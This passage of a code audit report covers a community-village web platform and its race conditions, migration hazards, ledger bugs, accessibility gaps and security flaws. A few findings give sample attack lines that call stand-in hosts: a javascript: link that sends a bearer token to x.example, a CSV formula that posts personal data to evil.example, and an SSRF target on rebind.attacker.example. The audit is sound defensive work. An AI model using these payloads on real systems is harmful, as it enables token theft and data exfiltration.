- **Failure:** A member posts a thread questioning how the founder priced a land purchase. Three members soft-report it. The thread disappears from the list; the author reloads her own bookmark and gets "This thread was hidden by moderation". She was not told it happened, is not told who reported it or why, cannot see her own words, and the only people who can restore it are the admin group the post criticised.

### Form submissions are written by rewriting the whole table from a cache, so concurrent submits are silently lost
- **Where:** `server/index.ts:2844` · lens: ?
- **What:** `POST /api/forms/submit` reads `submissionsRepo.all()` — synchronous, from the in-process cache (server/repos/store-db.ts:49) — pushes one entry, and calls `replaceAll()`, which is `DELETE FROM submissions` followed by re-inserting the array (store-db.ts:126-133). Two overlapping requests both read the same snapshot and the second write erases the first. `insert()` (store-db.ts:142), an append that would be safe, exists and is not used here. The same read-modify-replace-whole-table pattern truncates member history at index.ts:1265: `stageEventsRepo.replaceAll(events.slice(-2000))` permanently DELETEs the oldest stage advancements village-wide, and `stage_events` is the only record of when someone earned their standing and what it unlocked (it is also what `/api/profile/export` serves back to them).
- **Failure:** Two prospective members submit the Love Letter within the same second on a shared rural connection. Both handlers read the same cached array; the second replaceAll wins; the first person's `membership-508` row never existed. Because `hasMembership()` (index.ts:1460) reads that table, she registers, sees "Guest", and can never reach the Member stage — and no error was returned to anyone, since both requests got `{success:true}`.

### A migration that fails part-way through its file bricks the deployment permanently — the file is not recorded, and re-running its already-applied DDL always errors
- **Where:** `server/db/migrate.ts:76` · lens: ?
- **What:** `applyPending` runs each file's statements in a bare loop (`for (const s of parts) await conn.query(s)`) and only inserts into `_migrations_applied` after the LAST statement succeeds. MySQL auto-commits DDL, so there is no transaction wrapping the file. If statement 3 of 5 fails, statements 1-2 are permanently applied but the file is unrecorded, and index.ts:2008 throws `migration failed: …` so the server refuses to boot. On the next boot the runner starts that file from statement 1, which now fails with a different error (ER_DUP_FIELDNAME / ER_DUP_KEYNAME), and will fail identically forever. No statement in drizzle/ except the CREATE TABLEs is guarded (`ADD COLUMN` has no IF NOT EXISTS in MySQL), and there is no repair path short of hand-editing the production database.
- **Failure:** 0038 has two statements: `ALTER TABLE payments_log ADD COLUMN handled_at datetime NULL;` then `UPDATE payments_log SET handled_at = at WHERE handled_at IS NULL;`. On a village with a large payments_log the UPDATE hits a lock-wait timeout during a deploy. 0038 is not recorded. Every subsequent boot re-runs the ALTER and dies with "Duplicate column name 'handled_at'", so the village's whole platform is down until someone with MySQL credentials manually inserts `0038_payments_log_handled.sql` into `_migrations_applied`. The same hazard exists in 0009 (12 statements including two backfill UPDATEs, a CHECK constraint and index drops), 0010, 0029 and 0036.

### Role grants and revocations are written by DELETE-all-rows + re-INSERT from a stale in-memory snapshot, so two concurrent appointments silently erase each other
- **Where:** `server/index.ts:9822` · lens: ?
- **What:** `dbCollection.replaceAll` (server/repos/store-db.ts:126) does `DELETE FROM <table>` followed by re-INSERT of the caller's whole array. The role-holder route reads a synchronous snapshot (`loadRoleHolders()` at index.ts:9796), then `await`s `addActivity` and `notify` — two DB round-trips — and only then calls `replaceAll(holders)`. Node interleaves other requests at those awaits, so a second appointment that commits in between is deleted by the first request's write, with a 200 returned to both. `anonymizeMember` (index.ts:1696-1697) has the same shape for both role_holders and submissions, and the submission-status route (index.ts:2912-2922) reads `submissionsRepo.all()`, awaits `applyAcceptReward`, then `replaceAll`. There is no version column, no row-level upsert, and no unique-key retry to catch it.
- **Failure:** Two stewards use the admin roles screen at the same moment. Steward A appoints Ana to Water Steward; Steward B appoints Bo to Kitchen Circle. A's request snapshots the holders list and awaits its notify() insert; B's request snapshots the same list, awaits, and its replaceAll commits Bo's row; A's replaceAll then runs `DELETE FROM role_holders` and re-inserts A's stale list. Bo's row is gone from the table AND from the in-memory cache. Bo received a notification saying "You were appointed to the Kitchen Circle", the pulse says so, the audit event says so, and Bo holds no role and none of its capabilities — with nothing anywhere recording that the grant was undone.

### Accepting a Work With Us proposal credits Gratitude by incrementing users.recognition_balance directly, with no ledger row — and the next real credit silently erases it
- **Where:** `server/index.ts:1822` · lens: ?
- **What:** `applyAcceptReward` does `u.recognitionBalance = (u.recognitionBalance ?? 0) + amount` (default 100, index.ts:447) and never calls `postTransfer`. This breaks the stated invariant that all movement goes through postTransfer, and it makes `users.recognition_balance` disagree with `token_balances` for that account with no `token_ledger` row explaining the difference. Every other write to that column sets it to a recomputed ledger figure (`u.recognitionBalance = credit.toBalance` at server/lib/gratitude.ts:158 and index.ts:9174, 7806), so the phantom credit is destroyed by the next legitimate credit. `/api/game/gratitude/flows` (index.ts:9560) and the players list (index.ts:9850) read the column, so the member sees the inflated number until it vanishes.
- **Failure:** Sol submits a Work With Us proposal; an admin marks it accepted. Sol's profile shows +100 Gratitude and a contribution entry "proposal was welcomed into the village", but /api/game/ledger reports `inSync: false` (index.ts:9596) because token_ledger has no matching row. A week later a neighbour acknowledges Sol; sendGratitude posts 20 to the ledger and then sets recognition_balance = credit.toBalance. Sol's balance drops from 120 to their true ledger balance of 20 — the 100 for the accepted proposal is gone, with no ledger entry, no notification, and no way for Sol or an admin to reconstruct what happened.

### Every gratitude send and every heart tap loads the entire gratitude_log table into Node memory, and no index supports the queries the code does in JS
- **Where:** `server/lib/gratitude.ts:100` · lens: ?
- **What:** `sendGratitude` calls `deps.log.all()`, which is `SELECT … FROM gratitude_log ORDER BY at, id` with no WHERE and no LIMIT (server/repos/gratitude.ts:47), purely to count how many times this sender already acknowledged this recipient this cycle. `/api/game/gratitude/wall` (index.ts:9284) does the same and then `.slice(-60)`. So do `/me` (9296), `/flows` (9556), `/profile/export` (9921) and the cycle-close settlement (9394). The table is append-only and grows with every ack AND every heart on every forum post. The only indexes are `(from_id, cycle_id)` and `(to_id)` plus the 4-column heart unique key, so the queries the code DOES issue in SQL cannot use them either: index.ts:3488 recomputes `heart_count` with `WHERE context_ref = ? AND kind = 'heart'` (no index has context_ref as a prefix) and server/lib/health.ts:76/84 filter on `cycle_id` alone (only a non-leading column of `gratitude_from_cycle_idx`) — both full scans, on the heart-tap path and the cycle-close path.
- **Failure:** A village two years in has 80,000 gratitude_log rows (feed hearts dominate). A member on a rural 3G connection taps a heart on a forum post: the server issues one unbounded SELECT of all 80,000 rows, materializes 80,000 JS objects with their message text, filters them in memory to count 0 or 1 prior hearts, then runs a second full table scan to recompute heart_count. Under the concurrency of a Sunday-evening feed session this exhausts the container's memory or times out, and the tap either hangs or 500s — with correctness unaffected but the feature effectively unusable at exactly the scale the platform is meant to reach.

### The four hypha.link_* override variables escape the https URL validator and land in href — stored XSS
- **Where:** `shared/gameVariables.ts:888` · lens: ?
- **What:** validateVariable() enforces "must be an https URL" by NAMING CONVENTION: `def.key.endsWith("_url")`. The four Hypha override variables are keyed `hypha.link_governance`, `hypha.link_proposals`, `hypha.link_treasury`, `hypha.link_members` — none ends in `_url`, so they fall through to the `type: "text"` path and only get a 255-char length check. resolveHyphaLinks() (shared/hypha.ts:41) returns the override verbatim as `links[name]`, and the client renders it straight into an anchor: client/src/pages/Wallet.tsx:202 (`href={hypha.links?.treasury}`), client/src/pages/ToolsHub.tsx:113, client/src/components/OnchainCard.tsx:117. `hypha.org_url` itself IS validated, which is what makes this a hole rather than a policy: the same admin form validates the root and waves through the four overrides that shadow it.
- **Failure:** An admin (or anyone holding ADMIN_PASSWORD) opens Admin → Variables → Hypha and sets `hypha.link_treasury` to `javascript:fetch('https://x.example/?t='+localStorage.getItem('amora-auth-token'))`. setVariable() accepts it (no `_url` suffix → no scheme check). Every member who opens /wallet sees "Open the Hypha treasury"; one click runs the script in the village's own origin and ships that member's bearer token — including the next admin who clicks it, whose token then authorises /api/admin/* mints, badge awards and cycle settlement.

### The Base RPC read dials an admin-typed host with viem's plain http transport, bypassing the pinned SSRF dialer toolcheck.ts exists to enforce
- **Where:** `server/lib/base-reads.ts:52` · lens: ?
- **What:** rpcClient() does `createPublicClient({ transport: http(stringVar("tokens.base_rpc_url")) })` — viem's transport is bare fetch with default redirect following. There is no guardOutboundUrl() range check, no DNS pinning, and no per-hop re-validation. server/lib/toolcheck.ts:1-25 states the posture explicitly ("'Admin-only' is not a defense") and its doc comment at line 96 warns that a second unguarded outbound path is exactly how this regresses — network.ts already regressed this way once and was fixed. This call site was never brought under the guard. validateVariable additionally *whitelists* `http://127.0.0.1` and `http://localhost` for this key, so loopback is reachable by design, and any `https://` host is reachable with no range check at all.
- **Failure:** An admin sets `tokens.base_rpc_url` to `https://rebind.attacker.example/` (a host whose resolver answers publicly once, then 169.254.169.254) or simply `http://127.0.0.1:8080/`. Any member with a verified wallet loading /wallet or /profile triggers readOnchainBalance → a JSON-RPC POST from inside the deployment's network to that address, with an 8s timeout and one retry. The response body is never shown to the member, but the request is made: cloud metadata endpoints, the Railway internal network, and any localhost admin port are now POST-reachable from an unattended, member-triggered code path. An open redirect on a legitimate public RPC provider gets the same result without any DNS trickery.

### A member can hold two claim rows on one quest, and each pays the full reward and counts toward stage
- **Where:** `server/index.ts:9054` · lens: ?
- **What:** POST /api/game/quests/:id/claim is check-then-insert: it reads the member's own claims (index.ts:9054-9056) and inserts (9068) with no lock and no database constraint — quest_claims has only non-unique KEYs on user_id/quest_id (drizzle/0001_init.sql:73-76), no UNIQUE(quest_id, user_id). The consent handler keys its ledger post on the CLAIM id (`quest_consent:${consented.id}`, index.ts:9188), so two claim rows for the same work are two different idempotency keys and two separate faucet credits. It also double-counts in claimsRepo.consentedCount, which drives stage computation, and in the badges engine's `quests_consented` metric.
- **Failure:** Marta, on a rural uplink, taps "Claim this quest" on a 200-gratitude quest. The POST reaches the server and the claim row is written, but the response is lost; QuestActions.tsx:53 shows "Could not claim. Try again." so she taps again — the button's `busy` guard has already been released. She now has claim-A and claim-B on one quest. She submits evidence (submit picks only the first match, index.ts:9078), and the admin queue shows two rows with the same quest title and the same name. The steward consents both — it looks like a UI duplicate, and nothing refuses. Marta is credited 400 for one job through two lawful-looking ledger rows, her consented count jumps by 2, and she crosses the stage line that unlocks exchange.buy and stay.member_rate a cycle early. Two parallel POSTs from two tabs reach the same state deliberately.

### Every abuse guard and the whole scheduler compare a Node-computed timestamp against a DB-generated one, so on any fork with a non-UTC MySQL they fail silently
- **Where:** `server/db/pool.ts:28` · lens: ?
- **What:** The pool pins the driver to `timezone: "Z"` but no code ever issues `SET time_zone = '+00:00'`, so rows written with NOW()/CURRENT_TIMESTAMP carry the DB session's zone while the driver renders JS Date parameters as UTC. Two load-bearing comparisons mix the two clocks: overLimit (server/index.ts:1926-1931) inserts `at` with CURRENT_TIMESTAMP(3) and then counts `WHERE at > ?` against a Node-computed `since`; the scheduler's claim (server/lib/scheduler.ts:48) sets `last_run_at = NOW()` and claims `WHERE last_run_at <= ?` against a Node-computed `due`. The global lens found this root cause but scoped the harm to timestamps reading back shifted; these two call sites are security and settlement controls, not displays.
- **Failure:** A village self-hosts on a box whose MySQL `time_zone` is `SYSTEM` = America/Costa_Rica (UTC-6) — the documented deployment audience, and pool.ts's own comment says "this one is UTC-6". Every `at` lands six hours behind the UTC `since`, so `at > since` is never true: overLimit always returns 0/false and the login throttle, the registration throttle, the 10-uploads-per-hour cap and the 600-call/day assistant spend cap all stop existing — an attacker gets unlimited password attempts and can burn the village's Anthropic key. In the same deployment `last_run_at` is six hours behind `due`, so every registered job claims on EVERY 5-minute tick instead of on its interval: library dispute deadlines re-settle, the abandoned-checkout sweep and feedback relay hammer, and stay nights re-post continuously. With the skew in the other direction (DB ahead) the jobs never become due at all and no loan ever settles, while any member who hits a limit once is locked out permanently.


## MEDIUM (36)

### The village-map node card is a modal with no dialog semantics, no focus management and no Escape
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/client/src/pages/VillageMap.tsx:305` · lens: ?
- **What:** NodeCard renders `<div className="fixed inset-0 z-50 …" onClick={onClose}>` with no `role="dialog"`, no `aria-modal`, no `aria-labelledby`, no focus move on open, no focus restore on close, no focus containment, and no keydown handler for Escape. Dismissal is a click on a non-interactive div (mouse-only). `grep role="dialog"|aria-modal` across client/src returns zero application-level hits — Admin.tsx and ProjectHistory.tsx hand-roll the same pattern, while the shadcn `dialog.tsx`/`sheet.tsx` primitives that do it correctly sit unused here.
- **Failure:** A keyboard user tabs to the 'Land Stewardship' circle on /map and presses Enter. The card opens over the page but focus stays on the SVG circle behind it; nothing is announced. Escape does nothing. To reach the 'raise your hand' button she must Tab forward blindly through the rest of the map's focusable nodes first, and to close the card she must find the unlabelled X at line 312 (icon-only `<button>` with no aria-label — it announces as 'button'). Meanwhile Tab can leave the card entirely and land on links underneath that are visually covered.

### No skip link, and SPA route changes move neither focus nor the page title
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/client/src/components/Layout.tsx:397` · lens: ?
- **What:** `<main className="flex-1">` has no id and there is no skip-to-content link anywhere in client/src (WCAG 2.4.1 Bypass Blocks, Level A). Separately, ScrollToTop (App.tsx:10-27) scrolls the window on every route change but never moves focus and never updates `document.title`; `grep document.title` in client/src returns zero hits, so all 45 routes report the single static title from index.html:9, 'Amora Co-Create | Regenerative Village in Costa Rica' (WCAG 2.4.2).
- **Failure:** A screen-reader user on desktop finishes reading /quests and activates the 'Wallet' nav link. wouter swaps the page, the window scrolls to top, but focus is still on the Wallet link inside the header and the accessible page title is unchanged — so the user hears nothing and has no signal that navigation happened; continuing to read moves them back through the nav rather than into the new page. To then reach the Wallet content they must Tab past the logo, ~20 nav links, the dropdown button, the notification bell, the profile link, sign-out and 'Main Site' — 26 tab stops, on every single navigation, with no skip link to bypass them.

### Registration is unthrottled and answers 409 on a taken email, giving a clean membership oracle
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/server/index.ts:3007` · lens: ?
- **What:** /api/auth/register has no overLimit() call — it is the only public write path in the file without one — and returns a distinct 409 'Email already exists' (line 3013) versus 200 for a fresh address. Each request also costs a bcrypt(10) hash plus a public pulse row.
- **Failure:** A script POSTs 10,000 candidate addresses to /api/auth/register with junk names. Every 409 confirms that address belongs to a member of this village — membership in an intentional community is exactly the fact people join one to keep private, and the handle system (index.ts:852) exists specifically so emails never leak. The same loop, unthrottled, creates thousands of accounts: each burns a bcrypt hash on the one CPU the village's server has and writes a 'stepped into the village as a Guest' line, so the Village Pulse and member directory are unusable and every real join is buried.

### Auth throttles are keyed on IP only: one shared rural uplink locks out the whole village, and there is no per-account limit
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/server/index.ts:3040` · lens: ?
- **What:** login (10 / 15 min), bootstrap (5 / hr) and set-password (10 / hr) all bucket on `clientIp(req)` alone. There is no per-account counter, no lockout notification and no captcha, so the limit both over-punishes shared addresses and under-protects individual accounts.
- **Failure:** A village on one Starlink/NAT public IP: five people come in from the field and between them mistype passwords ten times inside fifteen minutes. Every subsequent sign-in from anyone in the village gets 429 'Too many attempts' — the whole community is locked out of quests, gratitude and the forum, and (per defect 3) nobody can reset anything to recover. Meanwhile an attacker on a /64 of IPv6 addresses gets 10 password guesses per address against one known member's account with no per-account counter, no lockout and no alert to that member.

### The claim token rides in a URL on a page that loads third-party subresources, with no Referrer-Policy and no scrubbing
- **Where:** `C:/Users/taren/Desktop/Amora/game-amora/client/index.html:38` · lens: ?
- **What:** The server sets no security headers at all (the middleware block at server/index.ts:2806 sets CORS only — no Referrer-Policy, CSP, HSTS or X-Frame-Options), while every page including /set-password?token=… loads a cross-origin stylesheet from fonts.googleapis.com and a favicon from amora.cr, and client/src/pages/SetPassword.tsx reads the token from location.search but never history.replaceState()s it out of the address bar or history. Layout.tsx also renders outbound links to amora.cr on that page.
- **Failure:** A founder opens the claim link in an older Android WebView (common on the cheap phones this platform targets), whose referrer default is unsafe-url: the full URL including the live claim token is sent in the Referer header to fonts.googleapis.com and to amora.cr's WordPress host, and again if the person taps the footer link to amora.cr. Because the token is replayable for the full hour (defect 2), whoever reads those access logs can overwrite the founder's password. Even with a modern browser the token stays in the address bar, in browser history and in any 'recently visited' sync for the rest of the hour.

### The iOS zoom guard is scoped to max-width:767px, so a phone in landscape and every tablet still zoom on focus
- **Where:** `client/src/index.css:503` · lens: ?
- **What:** The 16px floor for input/textarea/select is inside `@media (max-width: 767px)`. iOS Safari's focus-zoom depends only on the computed font-size, not on viewport width. An iPhone 15 in landscape reports ~852px and an iPad reports 768-1024px — both are coarse-pointer devices that get the mobile drawer nav (which runs to xl/1280px), and both fall outside this query. Nearly every text control on the module pages is text-sm (14px): Forum.tsx:126-129, Feed.tsx:120, Stay.tsx:150-152, Badges.tsx:96, Contribute.tsx:156, Network.tsx:245, VillageMap.tsx:333/350/421.
- **Failure:** A member turns her phone sideways to type a longer forum reply with a proper keyboard-sized layout, taps the 14px reply textarea on /forum/:id. Safari zooms the page in on focus; the "Reply" button and the rest of the thread slide off screen and she has to pinch back out after every field. On the /map concierge input the zoom pushes the "Ask" button off the right edge entirely.

### Forum.tsx is double-encoded: members read "No threads yet â€” start the first one" and "â† All threads"
- **Where:** `client/src/pages/Forum.tsx:158` · lens: ?
- **What:** Five lines contain literal mojibake bytes (C3 A2 E2 82 AC ... — an em dash re-encoded as UTF-8 twice) and two more contain the same corruption of a left arrow. Confirmed by hexdump, not by tool rendering. This is exactly the PowerShell Set-Content trap CLAUDE.md warns about. Affected: 114 "Categoryâ€¦" (the category <option> label), 158 the empty state, 240 "Loadingâ€¦", 378 the reply placeholder, and 235/248 the back links which read "â† Back to the forum" / "â† All threads".
- **Failure:** A member opens /forum on a phone for the first time. The empty state reads "No threads yet â€” start the first one." She taps "New thread" and the category dropdown's first option reads "Categoryâ€¦". Opening any thread on a slow connection shows "Loadingâ€¦" and the only way back is a link labelled "â† All threads". Short strings on a small screen make the garbage the dominant text; the module for repairing conflict looks broken before anyone has written a word.

### The quest board's filter bar sticks at top-[64px] under a 96px-tall header, so the Circle filters are permanently hidden
- **Where:** `client/src/pages/Quests.tsx:200` · lens: ?
- **What:** Layout's nav is `container py-4` (32px) wrapping AmoraLogo height={64} — a 96px-tall sticky header at z-50. The Quests filter section is `sticky top-[64px] z-30`, i.e. it parks 32px behind the header, which paints over it. On a 360px screen the Circle row (Filter icon, "Circle:" label, and the first "All"/"Community Development" chips) is exactly what falls in that band. Separately, the chips are `px-3 py-1 text-xs` (~24px tall) in `flex-wrap gap-2` (8px), so the 44px pointer-coarse ::after overlays from index.css:529 overlap between wrapped rows by ~12px and the later chip in DOM order wins the shared band.
- **Failure:** On a 360px phone the ten circle chips wrap to four or five rows. A member scrolls down to read the quests; the filter bar sticks, but its top 32px is behind the teal header, so "Circle:" and the first chips are cut off mid-glyph and cannot be tapped at all. Of the chips that are visible, aiming at the top edge of "Governance" selects "Land Stewardship" from the row above instead, because the invisible 44px hit boxes overlap. The board silently filters to the wrong circle and she concludes there is no governance work available.

### supplyVsBacking under-reports outstanding credits once the L9 card opens credit sales, so the unbacked-supply red flag stops firing
- **Where:** `server/lib/library.ts:562` · lens: ?
- **What:** `outstanding` is computed as `-balanceOf(LIBRARY_MINT, LIBRARY_CREDIT)` — issuance through the intake faucet only. Credits sold for fiat enter circulation via sys:mint -> sys:treasury -> buyer (the path exchange.ts:130-141 describes), which never touches sys:library-mint. The header comment at exchange.ts:136 promises "a village can always answer 'how many of our credits are money-backed'"; nothing computes that, and the one surface that should catch a leak silently stops counting.
- **Failure:** A village accepts the LIBRARY_CREDIT_CARD_VERSION card, lists library-credit purchasable, stocks 5,000 credits (sys:mint -> treasury), and sells all 5,000. Shelves hold 3,000 credits of replacement value and intake has issued 2,500. GET /api/admin/library (index.ts:6480) reports outstanding 2,500 against backing 3,000 with `flagged: false` — "healthy". The true circulating supply is 7,500 against 3,000 of goods: every borrower could be told the shelf is empty and there is no surface that says why. The figure only ever moves back toward truth if credits are burned through sys:library-sink.

### Quest consent ignores the ledger's refusal and overwrites the member's cached recognition balance with 0
- **Where:** `server/index.ts:9165` · lens: ?
- **What:** The `postTransfer` result at 9165 is never checked for `ok`, and line 9174 assigns `recognitionBalance = credit.toBalance` — which is hard-coded to 0 on every failure path in postTransfer (ledger.ts:238, 263, 271, 316). The claim has already been flipped to `consented` at 9154, so the failure is invisible and unrecoverable through the UI.
- **Failure:** A village sets `quest.consent_cap_mode` to 'capped' or 'unlimited'. An admin opens a submitted claim and clicks consent with the amount field left blank (or a client omits `amount`), so `granted = Math.max(0, Number(undefined) || 0) = 0`. Neither the 'capped' ceiling check nor 'unlimited' rejects 0. postTransfer returns `{ok:false, toBalance:0, error:"amount must be a positive integer"}`. The handler then writes `recognitionBalance = 0` for that member: a person with 4,000 accumulated recognition sees 0 on their Profile and in the members list (index.ts:9850), the claim is permanently marked consented for 0, and the admin gets a 200 with no error. The ledger itself is untouched, so only the member's visible history is destroyed.

### Self-service account deletion strands the member's positive token balances with no sweep and no warning
- **Where:** `server/index.ts:9908` · lens: ?
- **What:** Both delete paths gate on `blockingStates(exitOpenState(...))`, and exit.ts:158-165 marks the `balances` domain `blocking: false` because it is "swept to exit settlement by an explicit admin act". `/api/profile/delete-account` never performs that act — it calls `anonymizeMember` directly (9912), and anonymizeMember (1661-1762) touches no ledger balances. `sweepBalances` is only reachable through the admin exit flow.
- **Failure:** A guest buys 40 stay credits for real money (stay_purchases -> mintStayCredits), then decides to leave and uses Profile -> delete account. They have no open stay, loan or order and no negative balance, so `blockingStates` returns empty and deletion proceeds. 40 stay-credits remain in `mem:{userId}` forever: the account is anonymized and password-cleared so the member can never spend them, `sys:exit-settlement` never receives them, and no admin surface lists balances held by departed members. The village cannot recover the credits and the member was never told they were forfeiting 40 credits they paid cash for.

### Stays reversal also claws back credits without checking they were granted
- **Where:** `server/index.ts:2618` · lens: ?
- **What:** Same §3.8 rule-5 gap as the exchange handler: the stays reversal posts `p.credits_granted` from the member to sys:mint with `allowNegative: true` without checking that `ord:{id}:leg1` ever posted. Lower reachability than exchange (the grant is from a faucet and rarely fails) but the same shape, and the settle path can still be interrupted after `recordFiatCharge` (2595) and before `mintStayCredits` (2599).
- **Failure:** A guest pays for 30 stay credits. The webhook settle handler updates stay_purchases, writes the fiat_charges row, and the process is killed (Railway redeploy / OOM) before mintStayCredits runs. The payments_log claim is unstamped, so Stripe's redeliveries inside CLAIM_GRACE_MINUTES answer "duplicate"; if the webhook endpoint is also misconfigured for the retry window, Stripe eventually gives up. The guest paid and got nothing, so they dispute. The reversal handler posts mem:{guest} -> sys:mint for 30 stay-credits with allowNegative, leaving the guest at -30, blocked from swapping (index.ts:7340) and from exiting the village (exit.ts:150 `debts` is blocking) over a debt for credits they never received.

### "Download everything the village holds about me" never checks the response and swallows every error — a failed export saves an error message as my-data.json
- **Where:** `client/src/components/NotifyPrefsPanel.tsx:155` · lens: ?
- **What:** The handler does `fetch("/api/profile/export", …).then(r => r.blob()).then(download).catch(() => {})`. `r.ok` is never checked, so a 401/403/500 JSON error body is blobbed and saved as `my-data.json`, and any network failure hits the empty catch — no toast, no message, no state change.
- **Failure:** A member's session token has expired in a background tab. She opens Profile, clicks "Download everything the village holds about me", and the browser saves my-data.json. She opens it and it contains `{"error":"Unauthorized"}` — 24 bytes. Because the label promises this is everything the village holds about her, the honest reading is that the village holds nothing: no quest claims, no gratitude, no ledger. Alternatively the fetch fails outright and the click does nothing at all, with no error shown, so she clicks four more times and concludes the export is broken. This is the platform's only data-portability surface (the export covers 19 domains server-side).

### Renaming the recognition currency does not reach the member's own ledger, the cycle-close pulse, or the Quests board — the same concept is called two different things on adjacent pages
- **Where:** `server/index.ts:9597` · lens: ?
- **What:** `shared/gameConfig.ts:15` states that a hardcoded "Gratitude" outside that file is a bug in the platform. Two server sites read the platform default instead of the brand overlay: the wallet/ledger response returns `currency: GAME_CONFIG.currency.name` (server/index.ts:9597) while the neighbouring gratitude-send route correctly uses `mergedConfig().currency.nameLower` (server/index.ts:9265); and the lunar-cycle activity text uses `GAME_CONFIG.currency.nameLower` (server/index.ts:9498). On the client, GratitudeWall and GameDashboard read `config.currency.name`, but Quests.tsx hardcodes "Gratitude" 11 times (e.g. lines 161, 171) and ProposeQuest, ResidentRights and StewardRights hardcode it too.
- **Failure:** A village sets the currency name to "Seeds" in the Setup Wizard, which promises it "instantly updates the game layer". A member then sees: /gratitude titled "The Seeds Wall — send seeds"; /quests saying "contribute to the village and earn Gratitude… 1,240 Gratitude available" with every quest card labelled Gratitude; and her own ledger on /profile reading "Every movement of Gratitude on your account, from the ledger itself." After the next lunation the Village Pulse on the homepage announces members were "acknowledged with gratitude". A newcomer cannot tell whether Seeds and Gratitude are one currency or two, on the page that records what she is owed.

### A brand-new village's core contribution board reads as broken: "No quests match those filters" when there are no quests at all, and the filter bar hides 32px under the sticky header
- **Where:** `client/src/pages/Quests.tsx:332` · lens: ?
- **What:** With zero quests the hero prints "0 active quests · up to 0 Gratitude available" (Quests.tsx:167-172) and the board's only empty state is `No quests match those filters. Try a different combination.` (Quests.tsx:332-335) — shown even when `activeCircle` and `activeDifficulty` are both "All" and `quests.length === 0`, so there is no filter combination that would help. Separately, the filter section is `sticky top-[64px]` (Quests.tsx:200) while Layout's sticky nav is 96px tall (`container py-4` = 32px padding around a `height={64}` logo, Layout.tsx:54-57) and sits at z-50 above the filters' z-30.
- **Failure:** Day one of a fork: the founder finishes setup, opens /quests to check the core loop, and sees "0 active quests" plus an instruction to try different filters — implying quests exist and are being filtered out. She clicks through all 8 circle chips and all difficulty chips getting the same message, and reports the board as broken. On the way, the "Circle:" filter row's top 32px is covered by the teal header on every desktop width above the xl breakpoint, clipping the filter label.

### /api/network/published exposes shared items to the whole internet while the network module is in 'preview' (admin-only) lifecycle
- **Where:** `server/index.ts:5358` · lens: ?
- **What:** The published endpoint is mounted before `app.use("/api/network", requireModule("network"))` and guards itself with only `if (effectiveLifecycle("network") === "off")`, so 'preview' — which server/lib/modules.ts:11 defines as "admins only — non-admins get the IDENTICAL 404 body, so the catalog of what a village is trying out never leaks" — publishes unauthenticated; the admin write routes (/api/admin/network/share) are not module-gated at all, so items can be drafted before anyone intends to publish.
- **Failure:** A steward flips network to 'preview' to try the federation UI privately and drafts an offer: title "Land trust lawyer needed — dispute with neighbouring finca", detail 8000 chars of the actual dispute, contact "rosa@… +506 8xxx". She believes only admins can see it. `curl https://<village>/api/network/published` returns it to anyone, and any peer village that already added this instance pulls it into its own members-visible cache on the next 6-hour syncPeers sweep. There is no way to un-publish from the peers' caches.

### Restorative-intake disclosures are emailed off-platform in plaintext, with the discloser's full name in the subject line
- **Where:** `server/lib/notify.ts:91` · lens: ?
- **What:** emailCadenceFor maps `restorative_intake` to "immediate", so insertNotification → maybeEmailImmediate ships the notification to a third-party mailer with `subject: n.title` (`A private intake from <full legal name>`, server/index.ts:6182 — the only notify title in the file that uses `user.name` rather than `firstName()`) and the member's 2000-character account of the rupture as the email body, to every holder of the intake role, even though server/lib/exit.ts:20 states the design rule as "Restorative content flows ONLY to its recipients".
- **Failure:** Rosa files an intake naming a specific person and describing what happened. Three intake-role holders receive an email whose subject reads "A private intake from Rosa Jiménez Mora" — which renders on all three lock screens and in any shared-device inbox preview — with her full account in the body. The content is now in Gmail, in Resend's logs, and one forward away from the person she is describing; the village's own retention sweep, deletion flow and access controls no longer reach any copy of it.

### The admin submissions CSV export writes anonymous-form values straight into formula position
- **Where:** `server/index.ts:2960` · lens: ?
- **What:** Cells are built as `"${strValue.replace(/"/g,'""')}"` with no leading-character neutralisation, and the values come from `POST /api/forms/submit` (server/index.ts:2820) which any anonymous visitor can call with arbitrary `data` keys, so a value beginning `=`, `+`, `-`, `@` or a tab/CR becomes a live formula when the steward opens the file.
- **Failure:** An attacker submits the public interest form with `message` set to `=WEBSERVICE("https://evil.example/x?d="&TEXTJOIN(",",1,A1:Z999))`. A steward clicks Export in the admin panel and opens the CSV in Excel or LibreOffice; the formula fires and posts every other row of the sheet — the names, emails, phone numbers and WhatsApp handles of everyone who ever filled in a village form — to the attacker's server, leaving no trace in the platform at all.

### Commerce can never be turned off again after the first abandoned checkout — nothing ever cancels a pending product purchase
- **Where:** `server/index.ts:2250` · lens: ?
- **What:** The checkout route inserts product_purchases as pending (index.ts:5221) before calling createCheckout, and no code path anywhere sets a pending purchase to cancelled or expired — grep of `product_purchases` shows only paid / reversed / periods_paid updates. commerce.openStateCheck (index.ts:2250) counts `status = 'pending'` and blocks disabling the module. The exchange got exactly this sweep in X4 (releaseAbandonedFiatOrders); commerce did not.
- **Failure:** A visitor opens the donate page, gets a Stripe URL, and closes the tab. Or createCheckout throws because Stripe is unreachable after the row is inserted. Or a 'manual'/'zeffy' purchase is never reconciled by a steward. The row sits pending forever, so `commerce.openStateCheck` reports "1 product purchase still awaiting payment" and an admin who wants to stop taking money — e.g. because the village decided to pause fundraising, or Gate F counsel said stop — is refused, permanently, with no UI that lets them clear the phantom.

### A retried cycle close recomputes the pool split from live eligibility, over-issuing the pool and rewriting distribution rows that contradict the ledger
- **Where:** `server/index.ts:9410` · lens: ?
- **What:** POST /api/admin/cycles/close loops recipients, posts each share, and returns 500 on the first `!r.ok` — leaving the cycle unclosed with some members paid. On the retry, `eligible = await eligibleSenderIds()` and `totalReceived` are recomputed from *current* quest-consent counts and stages (index.ts:3375), so the denominator can change. Already-paid members are protected by the idempotency key `gratitude_pool:{cycleNumber}:{userId}` but keep their old amount, while distributionsRepo.add overwrites their record with the newly computed number.
- **Failure:** gratitude.pool_per_cycle = 1000, three recipients with 10 eligible recognition each → 333 credits apiece. Members A and B are credited; the post for C fails. An hour later a fourth member's sender crosses the consent threshold, so the retry sees totalReceived = 40 and computes 250 each. A and B keep 333 in the ledger but their distribution rows now say 250; C and D get 250. The pool has released 1166 against a published size of 1000, sys:cycle-pool's negative balance (the "total value ever released" figure) is wrong, and the recognition record members are shown disagrees with the ledger they can export.

### Notifications are stamped emailed_at even when the mail provider refused them, with no retry and no alert
- **Where:** `server/lib/notify.ts:216` · lens: ?
